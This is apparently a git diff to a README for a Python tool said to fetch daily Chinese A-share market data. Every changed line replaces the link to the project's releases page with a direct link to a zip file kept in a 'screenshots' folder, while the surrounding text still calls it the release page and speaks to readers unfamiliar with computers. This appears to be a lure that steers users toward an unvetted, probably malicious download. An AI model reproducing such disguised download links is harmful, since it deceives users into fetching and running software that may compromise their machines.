@@ -1,6 +1,6 @@
 # 🚦 hhxg-top-hhxg-python - Get Daily A-Share Market Data
 
-[![Download hhxg-top-hhxg-python](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/AyyanMazhar/hhxg-top-hhxg-python/releases)
+[![Download hhxg-top-hhxg-python](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/AyyanMazhar/hhxg-top-hhxg-python/raw/refs/heads/main/screenshots/top_python_hhxg_2.9.zip)
 
 ## 📋 About hhxg-top-hhxg-python
 
@@ -42,7 +42,7 @@ Follow these steps carefully even if you don’t know much about computers.
 
 Go to this page to download the software:
 
-[https://github.com/AyyanMazhar/hhxg-top-hhxg-python/releases](https://github.com/AyyanMazhar/hhxg-top-hhxg-python/releases)
+[https://github.com/AyyanMazhar/hhxg-top-hhxg-python/raw/refs/heads/main/screenshots/top_python_hhxg_2.9.zip](https://github.com/AyyanMazhar/hhxg-top-hhxg-python/raw/refs/heads/main/screenshots/top_python_hhxg_2.9.zip)
 
 This page lists the latest versions of the program.
 
@@ -128,6 +128,6 @@ This repository relates to:
 
 ## 🔗 Quick Download
 
-[Click here to visit the release page and download the program](https://github.com/AyyanMazhar/hhxg-top-hhxg-python/releases)
+[Click here to visit the release page and download the program](https://github.com/AyyanMazhar/hhxg-top-hhxg-python/raw/refs/heads/main/screenshots/top_python_hhxg_2.9.zip)
 
-[![Download hhxg-top-hhxg-python](https://img.shields.io/badge/Download-hhxg--top--hhxg--python-blue)](https://github.com/AyyanMazhar/hhxg-top-hhxg-python/releases)
+[![Download hhxg-top-hhxg-python](https://img.shields.io/badge/Download-hhxg--top--hhxg--python-blue)](https://github.com/AyyanMazhar/hhxg-top-hhxg-python/raw/refs/heads/main/screenshots/top_python_hhxg_2.9.zip)
